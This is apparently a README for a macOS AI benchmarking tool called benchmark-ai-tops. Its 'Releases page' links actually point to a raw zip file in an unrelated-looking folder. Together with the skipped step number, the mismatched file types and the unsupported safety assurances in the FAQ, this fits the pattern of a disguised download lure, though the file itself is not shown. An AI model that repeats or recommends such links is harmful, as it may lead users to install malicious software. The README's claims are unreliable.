## 📖 Description

benchmark-ai-tops is an AI Performance Benchmark Tool. It helps you measure performance for CPU, GPU (Metal), and NPU (Neural Engine) using GFLOPS and TOPS metrics. With this tool, users can easily evaluate their system's capabilities in handling AI workloads.

## 🚀 Getting Started

To begin, follow the steps below for a simple installation process. 

### 🔥 System Requirements

Before you install the tool, ensure your system meets these requirements:

- **Operating System**: macOS or Apple Silicon supported
- **Processor**: Any Intel or Apple M1/M2 chip
- **RAM**: Minimum of 4 GB recommended
- **Storage**: At least 200 MB free space

## 📥 Download & Install

1. Visit the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip) to download the latest version of the software.
2. Look for the latest release and click on it to view the available files.
3. Choose the file that matches your system. For example, if you’re using a Mac, you might need a file ending in `.dmg` or `.zip`.

5. Once downloaded, open the file and follow the instructions to install the application.

## ⚙️ How to Use

After installing, open the application. You will see a simple interface with options for CPU, GPU, and NPU tests. 

1. Select the test you want to run.
2. Click on the "Start Test" button.
3. Wait a few moments for the test to complete.
4. View your results in GFLOPS and TOPS, which will display clearly in the app.

## 🐛 Troubleshooting

If you encounter any issues during installation or testing:

- **Check Compatibility**: Ensure your system meets the requirements.
- **Reboot**: Sometimes, a simple restart can fix issues.
- **Reinstall**: If the app is not working, try reinstalling it from the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip).

If problems persist, consider checking online forums or user communities for additional support.

## 📚 Frequently Asked Questions (FAQ)

### What is GFLOPS and TOPS?

GFLOPS (Giga Floating Point Operations Per Second) measures how many calculations a processor can perform. TOPS (Tera Operations Per Second) is used primarily for AI operations. Both metrics indicate performance levels.

### Is it safe to use this application?

Yes, benchmark-ai-tops has been tested extensively to ensure safety and reliability. It does not collect personal data or require internet access for testing.

### Do I need to pay for this application?

No. benchmark-ai-tops is completely free to download and use.
